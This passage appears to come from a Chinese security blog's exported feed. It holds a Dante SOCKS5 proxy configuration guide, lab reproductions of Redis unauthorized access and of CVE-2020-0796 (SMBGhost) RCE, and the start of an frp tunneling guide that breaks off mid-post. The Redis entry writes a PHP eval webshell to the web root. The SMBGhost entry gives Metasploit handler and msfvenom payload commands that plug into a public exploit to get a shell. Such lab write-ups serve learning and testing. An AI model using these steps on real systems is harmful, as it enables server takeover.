ID（ libwrap：服务程序安全增强工具，对有状态连接的特定服务进行安全检测并实现访问控制）</span><br><span class="line">user.libwrap: nobody		#  默认有该行</span><br><span class="line"></span><br><span class="line">#  兼容性相关</span><br><span class="line">compatibility: sameport     #  当客户端连接后，socks 服务器将尝试使用与客户端使用的端口相同（需设置为 root 特权）</span><br><span class="line">compatibility: reuseaddr    #  允许端口复用（加了此行会报错，此处解释仅作参考）</span><br><span class="line"></span><br><span class="line">#  启用绑定扩展</span><br><span class="line">extension: bind</span><br><span class="line"></span><br><span class="line">#  超时设置</span><br><span class="line">timeout.negotiate: 30   #  设置连接超时时间</span><br><span class="line">timeout.io: 0	        #  设置空闲超时时间（0 为永不超时）</span><br><span class="line"></span><br><span class="line">#  接受来自地址（DNS）的连接</span><br><span class="line">srchost: nodnsunknown nodnsmismatch</span><br><span class="line"></span><br><span class="line">#  设置访问规则</span><br><span class="line">client pass &#123;</span><br><span class="line">        from: 0.0.0.0&#x2F;0 port 1-65535 to: 0.0.0.0&#x2F;0</span><br><span class="line">        clientmethod: rfc931		#  匹配密码文件中的所有 ID 用户</span><br><span class="line">&#125;</span><br><span class="line">client pass &#123;</span><br><span class="line">        from: 0.0.0.0&#x2F;0 port 1-65535 to: 0.0.0.0&#x2F;0</span><br><span class="line">        log: connect disconnect error		#  记录连接、断开、报错信息</span><br><span class="line">&#125;</span><br><span class="line">socks pass &#123;</span><br><span class="line">       from: 10.0.0.0&#x2F;8 to: 0.0.0.0&#x2F;0</span><br><span class="line">        protocol: tcp udp</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#  设置拒绝规则</span><br><span class="line">client block &#123;</span><br><span class="line">        from: 0.0.0.0&#x2F;0 to: 0.0.0.0&#x2F;0</span><br><span class="line">        log: connect disconnect error		#  记录连接、断开、报错信息</span><br><span class="line">&#125;</span><br><span class="line">socks block &#123;</span><br><span class="line">        from: 0.0.0.0&#x2F;0 port 1-65535 to: 192.168.1.0&#x2F;24</span><br><span class="line">        log: connect disconnect error		#  记录连接、断开、报错信息</span><br><span class="line">&#125;</span><br><span class="line">socks block &#123; </span><br><span class="line">        from: 0.0.0.0&#x2F;0 to: lo0</span><br><span class="line">        log: connect disconnect error		#  记录连接、断开、报错信息</span><br><span class="line">&#125;</span><br><span class="line">socks block &#123;				#  阻止任何其他地址连接到 example.com 域</span><br><span class="line">        from: 0.0.0.0&#x2F;0 to: .example.com port &#x3D; http</span><br><span class="line">        log: connect disconnect error		#  记录连接、断开、报错信息</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#  添加路由（服务器链接）</span><br><span class="line">route &#123;</span><br><span class="line"> from: 10.0.0.0&#x2F;8 to: 0.0.0.0&#x2F;0 port &#x3D; http via: socks.example.net port &#x3D; socks</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="三、配置-SOCKS5"><a href="#三、配置-SOCKS5" class="headerlink" title="三、配置 SOCKS5"></a>三、配置 SOCKS5</h2><p>在 <code>danted.conf</code> 文件末尾添加如下内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  指定日志文件保存的绝对路径</span><br><span class="line">logoutput: &#x2F;var&#x2F;log&#x2F;socks5.log</span><br><span class="line">#  进口 IP 或 网卡</span><br><span class="line">internal: eth0 port &#x3D; 8888</span><br><span class="line">#  进口网卡及端口</span><br><span class="line">internal: eth0 port &#x3D; 9999</span><br><span class="line">#  出口网卡</span><br><span class="line">external: eth0</span><br><span class="line">#  设置代理方式（rfc931）</span><br><span class="line">socksmethod: username none</span><br><span class="line">#  设置客户端规则</span><br><span class="line">clientmethod: none</span><br><span class="line">#  设置用户权限</span><br><span class="line">user.privileged: root</span><br><span class="line">#  非特权用户</span><br><span class="line">user.notprivileged: nobody</span><br><span class="line">#  如果编译时支持 libwrap，使用的用户 ID（ libwrap：服务程序安全增强工具，对有状态连接的特定服务进行安全检测并实现访问控制）</span><br><span class="line">user.libwrap: nobody</span><br><span class="line">#  设置访问规则</span><br><span class="line">client pass &#123;</span><br><span class="line">        from: 0.0.0.0&#x2F;0 port 1-65535 to: 0.0.0.0&#x2F;0</span><br><span class="line">        #  记录连接、断开、报错信息</span><br><span class="line">        log: connect disconnect error</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">socks pass &#123;</span><br><span class="line">        from: 0.0.0.0&#x2F;0 port 1-65535 to: 0.0.0.0&#x2F;0</span><br><span class="line">        protocol: tcp udp</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>停止服务：<code>systemctl stop danted</code><br>启动服务：<code>systemctl start danted</code><br>重启服务：<code>systemctl restart danted</code><br>查看服务状态：<code>systemctl status danted</code></p>
]]></content>
      <categories>
        <category>代理</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>proxy</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis 未授权访问漏洞复现</title>
    <url>/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</url>
    <content><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h2><p>Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI <a href="https://baike.baidu.com/item/C%E8%AF%AD%E8%A8%80">C语言</a>编写、支持网络、可基于内存亦可持久化的日志型、Key-Value<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93/103728">数据库</a>，并提供多种语言的API。从2010年3月15日起，Redis的开发工作由VMware主持。从2013年5月开始，Redis的开发由<a href="https://baike.baidu.com/item/Pivotal">Pivotal</a>赞助。</p>
<h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h2><p>Redis默认情况下，会绑定在0.0.0.0:6379，这样会将redis服务暴露在公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问redis以及读取redis的数据，攻击者在未授权访问redis的情况下可以利用redis的相关方法，进而成功在redis服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器</p>
<h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h2><p>Redis 2.x</p>
<p>Redis 3.x</p>
<p>Redis 4.x</p>
<p>Redis 5.x</p>
<h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  安装 apache</span><br><span class="line">sudo apt-get install apache2</span><br><span class="line">sudo systemctl restart apache2</span><br><span class="line">#  下载 redis 并解压</span><br><span class="line">cd &#x2F;</span><br><span class="line">sudo wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-2.8.17.tar.gz</span><br><span class="line">sudo tar xzvf redis-2.8.17.tar.gz</span><br><span class="line">#  安装 make</span><br><span class="line">cd &#x2F;redis-2.8.17</span><br><span class="line">sudo make</span><br><span class="line">#  启动</span><br><span class="line">sudo &#x2F;redis-2.8.17&#x2F;src&#x2F;redis-server &#x2F;redis-2.8.17&#x2F;redis.conf</span><br></pre></td></tr></table></figure>
<h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04  漏洞利用"></a>0x04  漏洞利用</h2><p>1、使用 <a href="https://github.com/MicrosoftArchive/redis/releases">redis客户端工具</a> 进行连接（此处有未授权访问能直接连接）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis-cli.exe -h 192.168.10.233</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/connect.png"></p>
<p>2、常用 redis 命令</p>
<p>redis 常用命令</p>
<p>详细命令：<a href="http://doc.redisfans.com/">http://doc.redisfans.com/</a></p>
<p>信息收集</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">info</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/info.png"></p>
<p>查看连接设置的名字</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">client getname</span><br></pre></td></tr></table></figure>
<p>新建默认没有名字如下</p>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/getname.png"></p>
<p>查看数据库中的键值对</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">keys *</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/keys.png"></p>
<p>删除键</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">del key 删除键为key的数据</span><br></pre></td></tr></table></figure>
<h3 id="写入-WebShell"><a href="#写入-WebShell" class="headerlink" title="写入 WebShell"></a>写入 WebShell</h3><p>需求：</p>
<ul>
<li><p>1、redis 未授权 能 redis-cli 连上</p>
</li>
<li><p>2、开了 web 并且知道路径</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config set dir &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">config set dbfilename redis.php</span><br><span class="line">set webshell &quot;&lt;?php echo @eval($_POST[&#39;pass&#39;]); ?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
<p>使用蚁剑连接</p>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/webshell-1.png"></p>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/webshell-2.png"></p>
<h2 id="0x05-漏洞修复"><a href="#0x05-漏洞修复" class="headerlink" title="0x05  漏洞修复"></a>0x05  漏洞修复</h2><p>参考：<a href="https://www.cnblogs.com/xun0523/p/9804999.html">https://www.cnblogs.com/xun0523/p/9804999.html</a></p>
<h2 id="0x06-参考-URL"><a href="#0x06-参考-URL" class="headerlink" title="0x06 参考 URL"></a>0x06 参考 URL</h2><p><a href="https://www.cnblogs.com/cl0ud/p/13873085.html">https://www.cnblogs.com/cl0ud/p/13873085.html</a></p>
<p><a href="https://www.cnblogs.com/bmjoker/p/9548962.html">https://www.cnblogs.com/bmjoker/p/9548962.html</a></p>
<p><a href="https://www.secpulse.com/archives/5357.html">https://www.secpulse.com/archives/5357.html</a></p>
<p><a href="https://www.cnblogs.com/-qing-/p/10978912.htm">https://www.cnblogs.com/-qing-/p/10978912.htm</a></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>Redis 漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows：CVE-2020-0796 RCE 漏洞复现</title>
    <url>/2021/02/10/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Windows%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Windows%EF%BC%9ACVE-2020-0796%20RCE/</url>
    <content><![CDATA[<h2 id="一、影响范围（需关闭-Win10-防火墙）："><a href="#一、影响范围（需关闭-Win10-防火墙）：" class="headerlink" title="一、影响范围（需关闭 Win10 防火墙）："></a>一、影响范围（需关闭 Win10 防火墙）：</h2><ul>
<li>Windows 10 Version 1903 for 32-bit Systems</li>
<li>Windows 10 Version 1903 for ARM64-based Systems</li>
<li>Windows 10 Version 1903 for x64-based Systems</li>
<li>Windows 10 Version 1909 for 32-bit Systems</li>
<li>Windows 10 Version 1909 for ARM64-based Systems</li>
<li>Windows 10 Version 1909 for x64-based Systems</li>
<li>Windows Server, version 1903 (Server Core installation)</li>
<li>Windows Server, version 1909 (Server Core installation)<br>

</li>
</ul>
<hr>
<h2 id="二、漏洞复现："><a href="#二、漏洞复现：" class="headerlink" title="二、漏洞复现："></a>二、漏洞复现：</h2><p><strong>环境准备：</strong></p>
<ul>
<li>kali，ip：192.168.201.152（攻击机）</li>
<li>受影响版本的Win10，ip：192.168.201.132（须关闭防火墙）</li>
</ul>
<p><strong>漏洞检测工具下载地址：</strong></p>
<ul>
<li><p><a href="https://github.com/ollypwn/SMBGhost">https://github.com/ollypwn/SMBGhost</a></p>
</li>
<li><ul>
<li><strong>漏洞检测工具使用方法：</strong></li>
</ul>
</li>
<li><ul>
<li><code>pythone3 scanner.py 192.168.0.0/24</code></li>
</ul>
</li>
</ul>
<p><strong>PoC下载地址：</strong></p>
<ul>
<li><p><a href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></p>
</li>
<li><ul>
<li><strong>POC 使用方法：</strong></li>
</ul>
</li>
<li><ul>
<li><code>python3.8 exploit.py -ip 192.168.201.132</code><br>

</li>
</ul>
</li>
</ul>
<hr>
<h2 id="三、漏洞复现："><a href="#三、漏洞复现：" class="headerlink" title="三、漏洞复现："></a>三、漏洞复现：</h2><p>1、先对使用kali对 9999 端口进行监听：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">set lport 9999</span><br><span class="line">set rhost 192.168.201.132</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/10/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Windows%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Windows%EF%BC%9ACVE-2020-0796%20RCE/1.png"></p>
<p>2、kali 使用 msf 生成木马（此处端口需跟监听的端口是一致的）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp LPORT&#x3D;9999 -b &#39;\x00&#39; -i 1 -f python&gt;test.py</span><br></pre></td></tr></table></figure>
<p>木马生成后的内容为：<br><img src= "/img/loading.gif" data-lazy-src="/2021/02/10/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Windows%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Windows%EF%BC%9ACVE-2020-0796%20RCE/2.png"></p>
<p>下载好的 POC：<br><img src= "/img/loading.gif" data-lazy-src="/2021/02/10/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Windows%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Windows%EF%BC%9ACVE-2020-0796%20RCE/3.png"></p>
<p>3、先把木马的内的 buf 替换为 USER_PAYLOAD ，再替换 exploit.py 内的 USER_PAYLOAD 行的内容</p>
<ul>
<li>:set nu       &emsp;&emsp;// 显示行</li>
<li>:91,127s/buf/USER_PAYLOAD    &emsp;&emsp;// 把91-127行的 buf 替换为 USER_PAYLOAD</li>
</ul>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/10/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Windows%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Windows%EF%BC%9ACVE-2020-0796%20RCE/4.png"></p>
<p>4、使用 Python3 运行（在此处需按一次回车）<br><img src= "/img/loading.gif" data-lazy-src="/2021/02/10/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Windows%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Windows%EF%BC%9ACVE-2020-0796%20RCE/5.png"><br>![](Windows：CVE-2020-0796 RCE/6.png)</p>
<p>5、此时监听的 9999 端口已收到访反弹的 shell</p>
<ul>
<li>// 如未收到反弹的 Shell 则使用 Python 重新运行一次 POC</li>
</ul>
<p><img src= "/img/loading.gif" data-lazy-src="/2021/02/10/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Windows%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Windows%EF%BC%9ACVE-2020-0796%20RCE/7.png"><br>![](Windows：CVE-2020-0796 RCE/8.png)</p>
<hr>
]]></content>
      <categories>
        <category>Windows 漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>frp</title>
    <url>/2021/02/11/%E4%BB%A3%E7%90%86/frp/frp/</url>
    <content><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>frp 是一个可用于内网穿透的高性能的反向代理应用，支持多种协议类型</p>
<ul>
<li>frp 为 C/S （客户端/服务端）架构</li>
<li>服务端的配置文件名为 frps.ini （公网）</li>
<li>客户端的配置文件名为 frpc.ini （内网）</li>
</ul>
<p><strong>下载地址：</strong><br><a href="https://github.com/fatedier/frp/tags">https://github.com/fatedier/frp/tags</a></p>
<p><strong>官方文档：</strong><br>中文：<a href="https://gofrp.org/docs/">https://gofrp.org/docs/</a><br>中文：<a href="https://github.com/fatedier/frp/blob/master/README_zh.md">https://github.com/fatedier/frp/blob/master/README_zh.md</a><br>英文：<a href="https://github.com/fatedier/frp#configuration-files">https://github.com/fatedier/frp#configuration-files</a></p>
<p><strong>文件介绍</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">frpc		    #  客户端二进制文件</span><br><span class="line">frpc_full.ini	#  客户端配置文件完整示例</span><br><span class="line">frpc.ini		#  客户端配置文件</span><br><span class="line"></span><br><span class="line">frps		    #  服务端二进制文件</span><br><span class="line">frps_full.ini	#  服务端配置文件完整示例</span><br><span class="line">frps.ini		#  服务端配置文件</span><br></pre></td></tr></table></figure>
<p><strong>实验环境</strong><br>VMware 15</p>
<ul>
<li>kali-1 IP：192.168.0.190（桥接模式，代替公网）</li>
<li>kali-2 IP：192.168.201.152（NAT模式，内网）</li>
</ul>
<h2 id="二、常用参数"><a href="#二、常用参数" class="headerlink" title="二、常用参数"></a>二、常用参数</h2><p>frps.ini（服务端，用于公网）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]		#  共同配置，必需有该配置（请勿修改该代理名）</span><br><span class="line">bind_addr &#x3D; 0.0.0.0	    #  绑定的 IP</span><br><span class="line">bind_port &#x3D; 7000	    #  服务端监听的端口</span><br><span class="line">vhost_http_port &#x3D; 80	#  为代理的 http 设置一个监听端口（通过域名访问网页时须使用此处设置的端口访问)</span><br><span class="line">vhost_https_port &#x3D; 443	#  为代理的 https 设置一个监听端口（通过域名访问网页时须使用此处设置的端口访问)</span><br><span class="line"></span><br><span class="line">#  安全</span><br><span class="line">token &#x3D; 123		#  设置身份验证</span><br><span class="line">log_file &#x3D; .&#x2F;frps.log	#  指定日志路径</span><br><span class="line">log_level &#x3D; info		#  指定日志级别（trace（跟踪）、debug（调试）、info（信息）、warn（警告）、error（错误）</span><br><span class="line">log_max_days &#x3D; 3	    #  指定日志记录最大天数</span><br><span class="line">max_ports_per_client &#x3D; 0	#  最大端口可用（默认为 0 ，表示无限制）</span><br><span class="line">allow_ports &#x3D; 2000-3000,3001,3003,4000-5000	#  端口白名单</span><br><span class="line"></span><br><span class="line">#  传输</span><br><span class="line">tls_only &#x3D; false	#  指定是否指接受 TLS 加密（默认为 false）</span><br><span class="line">tcp_mux &#x3D; true	#  开启 tcp 流多路复用（默认为 true）</span><br></pre></td></tr></table></figure>
<p>frpc.ini（客户端，用于内网）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]			#  共同配置，必需有该配置（请勿修改该代理名）</span><br><span class="line">server_add &#x3D; 192.168.0.190	#  服务端 IP（需和服务端的 IP 配置为一致）</span><br><span class="line">server_port &#x3D; 7000		#  服务端端口（需和服务端的端口配置为一致）</span><br><span class="line">dns_server &#x3D; 8.8.8.8	#  指定 DNS 服务器</span><br><span class="line">start &#x3D; ssh,web			#  启用代理名称为 ssh 跟 web 的代理（默认为空格，表示启用所有代理）</span><br><span class="line">user &#x3D; test_name		#  连接时在代理名称前面添加 test_name. （如当前代理名称为 common ，则 test_name.common）</span><br><span class="line"></span><br><span class="line">#  安全</span><br><span class="line">token &#x3D; 123		        #  设置身份验证（必须与服务端相同）</span><br><span class="line">log_file &#x3D; .&#x2F;frpc.log	#  指定日志路径（如指定了日志文件，则控制台不会显示相关信息（会显示在日志文件里））</span><br><span class="line">log_level &#x3D; info		#  指定日志级别（trace（跟踪）、debug（调试）、info（信息）、warn（警告）、error（错误）</span><br><span class="line">log_max_days &#x3D; 3	    #  指定日志记录最大天数</span><br><span class="line"></span><br><span class="line">#  传输</span><br><span class="line">login_faile_exit &#x3D; true	#  首次跟服务器连接失败时退出程序，如为 false 则失败后重新尝试连接（默认为 true）</span><br><span class="line">protocol &#x3D; tcp		    #  用于连接服务器的通信协议（支持 tcp、kcp、websocket，默认为 tcp）</span><br><span class="line">tls_enable &#x3D; true		#  通过 tls 连接服务端</span><br><span class="line">tcp_mux &#x3D; true		    #  开启 tcp 流多路复用（默认为 true，必须与服务端相同）</span><br><span class="line"></span><br><span class="line">[ssh]			        #  代理名称</span><br><span class="line">type &#x3D; tcp		        #  协议型</span><br><span class="line">local_ip &#x3D; 127.0.0.1</span><br><span class="line">local_port &#x3D; 22		    #  需代理的端口</span><br><span class="line">remote_port &#x3D; 6000	    #  远程端口（远程访问时使用此端口，如为 0 则服务端随机分配一个端口）</span><br><span class="line">bandwidth_limit &#x3D; 1MB	#  限制此代理的宽带（单位为 KB 和 MB）</span><br><span class="line">use_encryption &#x3D; true	#  如为 true 则与服务端的通信会被加密（默认为 false）</span><br><span class="line">use_compression &#x3D; false	#  如为 true 则消息将被压缩</span><br><span class="line"></span><br><span class="line">[web]			#  代理名称</span><br><span class="line">type &#x3D; http		#  类型</span><br><span class="line">local_ip &#x3D; 127.0.0.1</span><br><span class="line">local_port &#x3D; 80		    #  需代理的端口</span><br><span class="line">use_encryption &#x3D; true	#  如为 true 则与服务端的通信会被加密（默认为 false）</span><br><span class="line">use_compression &#x3D; false	#  如为 true 则消息将被压缩</span><br><span class="line">http_user &#x3D; admin	    #  访问网页时需要的用户名</span><br><span class="line">http_pwd &#x3D; passwd	    #  密码</span><br><span class="line">subdomain &#x3D; test.com	#  子域名</span><br><span class="line">custom_domains &#x3D; www.test.com	#  域名</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="三、基于-SSH"><a href="#三、基于-SSH" class="headerlink" title="三、基于 SSH"></a>三、基于 SSH</h2><p>1、由于是基于 ssh 的，所以需开启内网的 ssh 确保能正常连接（ kali 默认关闭 ssh ）</p>
<ul>
<li><p>1）ssh 配置文件默认路径为 <code>/etc/ssh/sshd_config</code><br>找到图中的两个地方，并修改为一样的即可<br><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BB%A3%E7%90%86/frp/frp/ssh-1.png"><br><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BB%A3%E7%90%86/frp/frp/ssh-2.png"></p>
</li>
<li><p>2）修改完后需重启服务：<code>sudo systemctl restart ssh</code></p>
</li>
</ul>
<p>2、配置服务端 frps.ini</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]            #  共同配置，必需有该配置（请勿修改该代理名）</span><br><span class="line">bind_port &#x3D; 7000    #  frps 监听的端口</span><br></pre></td></tr></table></figure>
<p>启动服务：<code>sudo ./frps -c ./frps.ini</code></p>
<p>3、配置客户端 frpc.ini</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]          #  共同配置，必需有该配置（请勿修改该代理名）</span><br><span class="line">server_addr &#x3D; 192.168.0.190     #  服务端 IP（需和服务端的 IP 配置为一致）</span><br><span class="line">server_port &#x3D; 7000              #  服务端端口（需和服务端的端口配置为一致）</span><br><span class="line"></span><br><span class="line">[ssh]                   #  代理名称</span><br><span class="line">type &#x3D; tcp              #  协议类型</span><br><span class="line">local_ip &#x3D; 127.0.0.1</span><br><span class="line">local_port &#x3D; 22         #  需代理的本地端口（需能正常访问）</span><br><span class="line">remote_port &#x3D; 6000      #  远程端口（远程访问时使用的端口）</span><br></pre></td></tr></table></figure>
<p>启动服务 <code>sudo ./frpc -c ./frpc.ini</code></p>
<p>4、使用 xshell 进行连接<br><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BB%A3%E7%90%86/frp/frp/ssh-3.png"><br><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BB%A3%E7%90%86/frp/frp/ssh-4.png"><br><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BB%A3%E7%90%86/frp/frp/ssh-5.png"></p>
<hr>
<h2 id="四、基于-WEB"><a href="#四、基于-WEB" class="headerlink" title="四、基于 WEB"></a>四、基于 WEB</h2><h3 id="提供简单的文件访问服务"><a href="#提供简单的文件访问服务" class="headerlink" title="提供简单的文件访问服务"></a>提供简单的文件访问服务</h3><ul>
<li>1）配置服务端 frps.ini</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]            #  共同配置，必需有该配置（请勿修改该代理名）</span><br><span class="line">bind_port &#x3D; 7000    #  frps 监听的端口</span><br></pre></td></tr></table></figure>
<p>启动服务：<code>sudo ./frps -c ./frps.ini</code></p>
<ul>
<li>2）配置客户端 frpc.ini</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]        #  共同配置，必需有该配置（请勿修改该代理名）</span><br><span class="line">server_addr &#x3D; 192.168.0.190 #  服务端 IP（需和服务端的 IP 配置为一致）</span><br><span class="line">server_port &#x3D; 7000          #  服务端端口（需和服务端的端口配置为一致）</span><br><span class="line"></span><br><span class="line">[plugin_static_file]        #  代理名称</span><br><span class="line">type &#x3D; tcp                  #  协议类型</span><br><span class="line">remote_port &#x3D; 6002          #  远程端口（远程访问时使用的端口）</span><br><span class="line">plugin &#x3D; static_file        #  加载 static_file 插件</span><br><span class="line">plugin_local_path &#x3D; &#x2F;var    #  须访问的路径</span><br><span class="line">plugin_http_user &#x3D; admin    #  用户名</span><br><span class="line">plugin_http_passwd &#x3D; passwd #  密码</span><br></pre></td></tr></table></figure>
<p>启动服务：<code>sudo ./frpc -c ./frpc.ini</code></p>
<ul>
<li>3）服务端使用浏览器访问<br><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BB%A3%E7%90%86/frp/frp/wj-1.png"><br><img src= "/img/loading.gif" data-lazy-src="/2021/02/11/%E4%BB%A3%E7%90%86/frp/frp/wj-2.png"></li>
</ul>
<h3 id="基于-IP-访问-http"><a href="#基于-IP-访问-http" class="headerlink" title="基于 IP 访问 http"></a>基于 IP 访问 http</h3><ul>
<li>1）配置服务端 frps.ini</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]            #  共同配置，必需有该配置（请勿修改该代理名）</span><br><span class="line">bind_port &#x3D; 7000    #  frps 监听的端口</span><br><span class="line">vhost_http_port &#x3D; 2333      #  为代理的 http 设置一个监听端口（通过域名访问网页时须使用此处设置的端口访问)</span><br></pre></td></tr></table></figure>
<p>启动服务：<code>sudo ./frps -c ./frps.ini</code></p>
<ul>
<li>2）配置客户端 frpc.ini</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]            #  共同配置，必需有该配置（请勿修改该代理名）</span><br><span class="line">server_addr &#x3D; 192.168.0.190     #  服务端 IP（需和服务端的 IP 配置为一致）</span><br><span class="line">server_port &#x3D; 7000              #  服务端端口（需和服务端的端口配置为一致）</span><br><span class="line"></span><br><span class="line">[web]                   #  代理名称</span><br><span class="line">type &#x3D; tcp              #  协议类型</span><br><span class="line">local_ip &#x3D; 127.0.0.1</span><br><span class="line">local_port &#x3D; 80         #  需代理的本地端口（需能正常访问）</span><br><span class="line">remote_port &#x3D; 7890      #  远程端口（通过 IP 访问网页时须使用此处设置的端口访问）</span><br></pre></td></tr></table></figure>
<p>启动服务：<code>sudo ./frpc -c ./frpc.ini</code></p>
<p><strong>或客户端 frpc.ini 配置文件内容为</strong></p>
